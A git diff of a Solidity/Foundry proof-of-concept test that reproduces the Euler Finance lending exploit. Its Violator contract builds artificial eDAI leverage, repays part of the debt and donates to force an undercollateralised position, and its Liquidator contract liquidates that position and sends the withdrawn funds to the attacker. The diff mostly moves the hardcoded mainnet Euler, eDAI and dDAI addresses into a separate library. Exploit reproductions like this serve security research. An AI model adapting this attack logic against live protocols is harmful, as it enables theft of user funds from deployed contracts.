@@ -1,5 +1,4 @@
 // SPDX-License-Identifier: UNLICENSED
-// TODO update sol version
 pragma solidity ^0.8.4;
 
 import {Test, console2} from "forge-std/Test.sol";
@@ -11,14 +10,9 @@ import {EToken} from "euler-contracts/modules/EToken.sol";
 import {DToken} from "euler-contracts/modules/DToken.sol";
 import {Euler} from "euler-contracts/Euler.sol";
 import {Liquidation} from "euler-contracts/modules/Liquidation.sol";
+import {Addresses} from "./libraries/Addresses.sol";
 
 error NotEnoughFunds(uint256 balance, uint256 amount);
-
-library EulerAddresses {
-    address constant EULER = 0x27182842E098f60e3D576794A5bFFb0777E025d3;
-    address constant eDAI = 0xe025E3ca2bE02316033184551D4d3Aa22024D9DC;
-    address constant dDAI = 0x6085Bc95F506c326DCBCD7A6dd6c79FBc18d4686;
-}
 
 contract EulerHackPoC is FlashLoanSimpleReceiverBase, Test {
 
@@ -102,9 +96,9 @@ contract Violator {
         }
 
         // Approve Euler contract
-        _token.approve(EulerAddresses.EULER, minBalance);
+        _token.approve(Addresses.EULER, minBalance);
 
-        EToken eToken = EToken(EulerAddresses.eDAI);
+        EToken eToken = Addresses.eDAI;
 
         //3. Deposit 2/3 to eDAI
         eToken.deposit(0, _amount);
@@ -113,9 +107,9 @@ contract Violator {
         uint256 amountLeveraged = _amount * 10;
         eToken.mint(0, amountLeveraged);
 
-        DToken dToken = DToken(EulerAddresses.dDAI);
+        DToken dToken = Addresses.dDAI;
 
-        // 5. Repay half of the DAI violator’s position, causing their dDAI balance to decrease
+        // 5. Repay half of the DAI violator’s position, causing dDAI balance to decrease
         dToken.repay(0, _amount / 2);
 
         // 6. Create another 10x artificial eDAI leverage
@@ -143,9 +137,8 @@ contract Liquidator {
         Liquidation.LiquidationOpportunity memory liq =  liquidation.checkLiquidation(address(this), _violator, address(_token), address(_token));
         liquidation.liquidate(_violator, address(_token), address(_token), liq.repay, liq.yield-1);
 
-        EToken(EulerAddresses.eDAI).withdraw(0, _token.balanceOf(EulerAddresses.EULER));
+        Addresses.eDAI.withdraw(0, _token.balanceOf(Addresses.EULER));
         _token.transfer(_attacker, _token.balanceOf(address(this)));
     }
-
 
 }
